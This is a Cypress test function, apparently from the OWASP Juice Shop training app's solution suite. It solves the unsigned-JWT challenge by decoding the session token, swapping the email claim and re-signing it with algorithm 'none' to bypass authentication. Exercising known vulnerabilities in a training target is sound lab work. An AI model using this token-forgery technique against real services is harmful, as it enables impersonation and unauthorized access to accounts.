export function jwtUnsignedChallenge() {
 
  // Login with cypress account
  cy.signin('cypress@mail.com','cypress');
    
  cy.getCookie('token').should('exist');
    
  // le cookie n'est pas encore setté par la webapp.
  // il faudra récupérer le token depuis la reponse http
  cy.getCookie('token').then((cookie) => {
          
    const jwt = require('jsonwebtoken');
        
    // Get Token
    var token = jwt.decode(cookie.value, {complete: true});
    expect(token.payload.data.email).to.equal('cypress@mail.com');
         
    // Forge an unsigned Token
    token.payload.data.email = 'jwtn3d@juice-sh.op';
    var unsignedToken = jwt.sign(token.payload,'nosecret',{ algorithm: 'none'});
         
    // Forge POST request to create an admin user
    const options = {
      method: 'GET',
      url: '/api/Products/1',
      auth: {
        bearer: unsignedToken
      }
    };
    
    cy.request(options).then(() => {
      // check if challenge is solved
      cy.isSolvedChallenge('jwtUnsignedChallenge').should('eq', true);
      // Logout
      cy.visit('http://localhost:3000/#/login').then(() => {
        cy.get('#navbarAccount').click();
        cy.get('#navbarLogoutButton > span').click();
      });
    });
    
  });
  
}
